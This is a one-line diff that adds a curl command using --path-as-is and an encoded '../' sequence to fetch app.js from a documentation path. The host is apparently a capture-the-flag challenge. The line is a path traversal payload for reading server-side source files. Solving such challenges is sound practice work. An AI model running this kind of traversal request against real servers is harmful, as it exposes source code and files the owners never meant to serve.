@@ -1,0 +1,1 @@
+curl --path-as-is 'https://logmepolicy.appsecil.ctf.today/documentation/..%2fapp.js'
